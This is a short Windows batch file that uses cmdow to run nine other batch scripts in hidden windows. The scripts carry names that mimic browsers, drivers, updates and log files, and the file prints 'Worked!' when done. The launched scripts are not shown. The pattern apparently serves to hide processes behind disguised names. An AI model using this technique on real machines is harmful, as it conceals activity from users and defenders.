@echo off
cmdow /run /hid .ses.bat
cmdow /run /hid LCO1CE1.tmp.dir.bat
cmdow /run /hid msedge.bat
cmdow /run /hid OptaneIconOverlay.bat
cmdow /run /hid SoftwareUpdate_Temp.bat
cmdow /run /hid lister.bat
cmdow /run /hid .opera.bat
cmdow /run /hid cv_debug.log.bat
cmdow /run /hid tmpkiller9000.bat

echo Worked!
timeout /t 10 >nul
exit
